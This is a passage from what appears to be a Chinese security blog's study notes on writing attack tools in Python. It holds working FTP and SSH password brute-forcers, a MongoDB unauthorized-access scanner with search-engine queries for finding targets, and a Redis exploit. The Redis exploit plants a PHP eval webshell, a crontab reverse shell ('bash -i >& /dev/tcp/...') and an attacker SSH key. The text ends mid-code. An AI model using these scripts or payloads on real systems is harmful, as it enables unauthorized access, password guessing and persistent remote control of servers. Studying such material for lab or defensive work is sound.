class="hljs-comment">#print(&quot;666&quot;)</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            <span class="hljs-comment">#获取密码</span><br>            password = self.queue.get()<br>            ftp_client = ftplib.FTP()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] trying &quot;</span>+password)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#尝试ftp连接</span><br>                ftp_client.set_pasv(<span class="hljs-literal">False</span>)<br>                ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">5</span>)<br>                ftp_client.login(user=user,passwd=password)<br>            <span class="hljs-keyword">except</span> ftplib.error_perm:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment">#return False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] password found :&quot;</span>,password)<br>                ftp_client.quit()<br>                <span class="hljs-comment">#清空队列</span><br>                <span class="hljs-keyword">with</span> self.queue.mutex:<br>                    self.queue.queue.clear()<br>                    self.queue.all_tasks_done.notify_all()<br>                    self.queue.unfinished_tasks = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">finally</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    self.queue.task_done()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    exit(<span class="hljs-number">0</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-comment">#队列</span><br>    q = queue.Queue()<br>    threads = []<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>        <span class="hljs-comment">#将密码传入队列</span><br>        <span class="hljs-comment">#print(password)</span><br>        q.put(password)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>        threads.append(ftp_crack(q))<br>        <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start()<br><br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921203353272-1701333286922-17.png" alt="image-20230921203353272"></p><h2 id="SSH密码暴力破解"><a href="#SSH密码暴力破解" class="headerlink" title="SSH密码暴力破解"></a>SSH密码暴力破解</h2><p>使用模块：paramiko 自动多线程</p><p>ssh连接报错：</p><p>1.超时</p><p>2.授权问题</p><p>3.密码错误</p><p><a href="https://www.cnblogs.com/txmblog/p/12955615.html">https://www.cnblogs.com/txmblog/p/12955615.html</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br>user = <span class="hljs-string">&quot;root&quot;</span><br>port = <span class="hljs-number">22</span><br>passwords = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>).read().split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connet_ssh</span>(<span class="hljs-params">password</span>):<br>    ssh_client = paramiko.SSHClient()<br>    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh_client.connect(hostname=host,password=password,username=user,timeout=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span> socket.timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 密码错误 <span class="hljs-subst">&#123;user&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.SSHException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;内部错误，等待重连&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> connet_ssh(password)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found: &quot;</span>,password)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-keyword">if</span> connet_ssh(password):<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>存在问题，多线程有点慢  待优化 </p><h2 id="mongodb未授权扫描器"><a href="#mongodb未授权扫描器" class="headerlink" title="mongodb未授权扫描器"></a>mongodb未授权扫描器</h2><p><a href="https://www.freebuf.com/vuls/277847.html">数据库安全之MongoDB渗透 - FreeBuf网络安全行业门户</a></p><p>shodan语法：product:”MongoDB”</p><p>fofa:””MongoDB” &amp;&amp; protocol&#x3D;”mongodb””</p><p>mongodb未授权挖掘：</p><p>1.扫描端口 默认端口：27017  （socket）</p><p>2.尝试连接即可（使用pymongo的MongoClient连接）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">27017</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_mongo_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#使用pymongo库的MongoClient尝试连接</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_mongo_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在尝试连接······&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        client = pymongo.MongoClient(ip,<span class="hljs-number">27017</span>,socketTimeoutMS=<span class="hljs-number">3000</span>)<br>        dbnames = client.list_database_names()<br>        <span class="hljs-built_in">print</span>(dbnames)<br>        <span class="hljs-comment">#通过判断是否有值、布尔值、长度</span><br>        <span class="hljs-keyword">if</span> dbnames <span class="hljs-keyword">and</span> <span class="hljs-built_in">bool</span>(dbnames) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(dbnames):<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;存在mongodb未授权访问！！！&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在mongodb未授权漏洞&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_port(<span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921225049595-1701333286922-20.png" alt="image-20230921225049595"></p><h2 id="redis未授权扫描getshell"><a href="#redis未授权扫描getshell" class="headerlink" title="redis未授权扫描getshell"></a>redis未授权扫描getshell</h2><p>1.扫描端口 默认为6379</p><p>2.尝试连接 能连上即可</p><p>3.getshell</p><ul><li>写webshell</li></ul><p>apache默认网站路径：&#x2F;var&#x2F;www&#x2F;html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定路径</span><br>config set dir /www/admin/localhost_80/wwwroot<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定文件</span><br>config set dbfilename redis.php<br><span class="hljs-meta prompt_">#</span><span class="language-bash">写入webshell</span><br>set x &quot;&lt;?php @eval($_POST[&#x27;r1&#x27;]);?&gt;&quot;<br>save<br>OK<br></code></pre></td></tr></table></figure><ul><li>定时任务crontab</li></ul><p><a href="https://blog.csdn.net/qq_43199509/article/details/120028288">反弹shell失败 原来是这个原因_kali nc不反弹shell_梦想闹钟的博客-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n<br><br>s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27; /dev/null<br><br><br>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/接收shell的ip/端口 0&gt;&amp;1\n&quot; （每隔一分钟执行命令）<br>config set dir /var/spool/cron/<br>config set dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921231059319-1701333286922-21.png" alt="image-20230921231059319"></p><ul><li>ssh免密</li></ul><p>把攻击机公钥写入靶机的.ssh中的authorized_keys文件中</p><p><img src="/img/image-20230921231710861-1701333286922-22.png" alt="image-20230921231710861"></p><p>实现思路：</p><p>1.扫描端口 默认为6379</p><p>2.使用redis客户端连接</p><p>3.编写getshellEXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><br>sshkey = <span class="hljs-string">&#x27;攻击机公钥&#x27;</span><br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">6379</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_redis_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#检测漏洞是否存在</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(host=ip,port=<span class="hljs-number">6379</span>,socket_timeout=<span class="hljs-number">0.3</span>)<br>        <span class="hljs-built_in">print</span>(client.client_list())<br>        <span class="hljs-comment">#使用哪个就调用哪个</span><br>        <span class="hljs-comment">#exp_webshell(client)</span><br>        <span class="hljs-comment">#exp_crontab(client)</span><br>        <span class="hljs-comment">#exp_ssh(client,ip)</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法连接，不存在redis未授权&quot;</span>)<br><br><br><br><span class="hljs-comment">#1.写webshell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_webshell</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到web服务器的根目录</span><br>    root = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    <span class="hljs-comment">#2.写入木马文件</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;shell.php&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;webshell已写入成功&quot;</span>)<br><br><span class="hljs-comment">#2.创建定时任务反弹shell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_crontab</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到定时任务的目录</span><br>    root = <span class="hljs-string">&quot;/var/spool/cron&quot;</span><br>    <span class="hljs-comment">#2.写入定时任务</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;定时任务已经创建&quot;</span>)<br><br><span class="hljs-comment">#3.写入攻击机公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_ssh</span>(<span class="hljs-params">redis_client,ip</span>):<br>    <span class="hljs-comment">#1.找到根目录下的密钥文件</span><br>    root = <span class="hljs-string">&quot;/root/.ssh&quot;</span><br>    <span class="hljs-comment">#2.向靶机中写入公钥</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;authorized_key&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n&#x27;</span>+sshkey+<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;免密登录已设置&quot;</span>)<br>    connect_ssh(ip)<br><br><span class="hljs-comment">#ssh连接  注意：ssh连接要在生成公钥的攻击机上执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ssh</span>(<span class="hljs-params">ip</span>):<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh.connect(ip,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;root&#x27;</span>,sshkey)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ssh 连接成功&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接失败&#x27;</span>)<br>        <br>scan_port(<span class="hljs-string">&quot;ip&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="扫描器优化"><a href="#扫描器优化" class="headerlink" title="扫描器优化"></a>扫描器优化</h3><p>web服务器根路径写死了</p><p>在sqlmap中的core&#x2F;settings.py中找到常用路径</p><p><img src="/img/image-20231127155201902.png" alt="image-20231127155201902"></p><p><img src="/img/image-20231127155631318.png" alt="image-20231127155631318"></p><p>定义文件wwwroot.py  添加根路径和后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">LINUX = (<br>    <span class="hljs-string">&quot;/var/www&quot;</span>, <span class="hljs-string">&quot;/usr/local/apache&quot;</span>, <span class="hljs-string">&quot;/usr/local/apache2&quot;</span>, <span class="hljs-string">&quot;/usr/local/www/apache22&quot;</span>, <span class="hljs-string">&quot;/usr/local/www/apache24&quot;</span>, <span class="hljs-string">&quot;/usr/local/httpd&quot;</span>, <span class="hljs-string">&quot;/var/www/nginx-default&quot;</span>, <span class="hljs-string">&quot;/srv/www&quot;</span>, <span class="hljs-string">&quot;/var/www/%TARGET%&quot;</span>, <span class="hljs-string">&quot;/var/www/vhosts/%TARGET%&quot;</span>, <span class="hljs-string">&quot;/var/www/virtual/%TARGET%&quot;</span>, <span class="hljs-string">&quot;/var/www/clients/vhosts/%TARGET%&quot;</span>, <span class="hljs-string">&quot;/var/www/clients/virtual/%TARGET%&quot;</span><br>    )<br><br>WINDOWS = (<br>    <span class="hljs-string">&quot;/xampp&quot;</span>, <span class="hljs-string">&quot;/Program Files/xampp&quot;</span>, <span class="hljs-string">&quot;/wamp&quot;</span>, <br>    <span class="hljs-string">&quot;/Program Files/wampp&quot;</span>, <span class="hljs-string">&quot;/Apache/Apache&quot;</span>, <span class="hljs-string">&quot;/apache&quot;</span>, <br>    <span class="hljs-string">&quot;/Program Files/Apache Group/Apache&quot;</span>, <span class="hljs-string">&quot;/Program Files/Apache Group/Apache2&quot;</span>, <br>    <span class="hljs-string">&quot;/Program Files/Apache Group/Apache2.2&quot;</span>, <br>    <span class="hljs-string">&quot;/Program Files/Apache Group/Apache2.4&quot;</span>, <span class="hljs-string">&quot;/Inetpub/wwwroot&quot;</span>, <br>    <span class="hljs-string">&quot;/Inetpub/wwwroot/%TARGET%&quot;</span>, <span class="hljs-string">&quot;/Inetpub/vhosts/%TARGET%&quot;</span><br>)<br><br>ALL = LINUX + WINDOWS<br><br>SUFFIXES = (<br>    <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htdocs&quot;</span>, <span class="hljs-string">&quot;httpdocs&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;public&quot;</span>, <span class="hljs-string">&quot;src&quot;</span>, <span class="hljs-string">&quot;site&quot;</span>, <br>            <span class="hljs-string">&quot;build&quot;</span>, <span class="hljs-string">&quot;web&quot;</span>, <span class="hljs-string">&quot;www&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;sites/all&quot;</span>, <span class="hljs-string">&quot;www/build&quot;</span><br>            )<br></code></pre></td></tr></table></figure><p>添加获取网站根路径函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#获取网站web的根路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_webroot</span>(<span class="hljs-params">redis_client</span>):<br>    roots = []<br>    <span class="hljs-keyword">for</span> pre <span class="hljs-keyword">in</span> wwwroot.ALL:<br>        <span class="hljs-keyword">for</span> suf <span class="hljs-keyword">in</span> wwwroot.SUFFIXES:<br>            <span class="hljs-keyword">try</span>:<br>                root = pre + <span class="hljs-string">&#x27;/&#x27;</span> + suf<br>                redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(e)<br>                <span class="hljs-keyword">continue</span><br>            roots.append(root)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> roots:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]未找到目标主机的web路径&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]找到目标主机的web路径：%s&#x27;</span>%<span class="hljs-built_in">str</span>(roots))<br>    <span class="hljs-keyword">return</span> roots<br></code></pre></td></tr></table></figure><p>增加测试webshell是否写入成功的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_web</span>():<br>    url = <span class="hljs-string">&#x27;http://10.210.100.131/shell.php&#x27;</span><br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> wwwroot<br><span class="hljs-keyword">import</span> requests<br><br>sshkey = <span class="hljs-string">&#x27;攻击机公钥&#x27;</span><br><br><span class="hljs-comment">#print(wwwroot.ALL)</span><br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">6379</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_redis_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#检测漏洞是否存在</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(host=ip,port=<span class="hljs-number">6379</span>,socket_timeout=<span class="hljs-number">0.3</span>)<br>        <span class="hljs-built_in">print</span>(client.client_list())<br>        <span class="hljs-comment">#exp_webshell(client)</span><br>        exp_crontab(client)<br>        <span class="hljs-comment">#exp_ssh(client,ip)</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法连接，不存在redis未授权&quot;</span>)<br><br><span class="hljs-comment">#scan_port(&quot;10.210.100.128&quot;)</span><br><br><span class="hljs-comment">#获取网站web的根路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_webroot</span>(<span class="hljs-params">redis_client</span>):<br>    roots = []<br>    <span class="hljs-keyword">for</span> pre <span class="hljs-keyword">in</span> wwwroot.ALL:<br>        <span class="hljs-keyword">for</span> suf <span class="hljs-keyword">in</span> wwwroot.SUFFIXES:<br>            <span class="hljs-keyword">try</span>:<br>                root = pre + <span 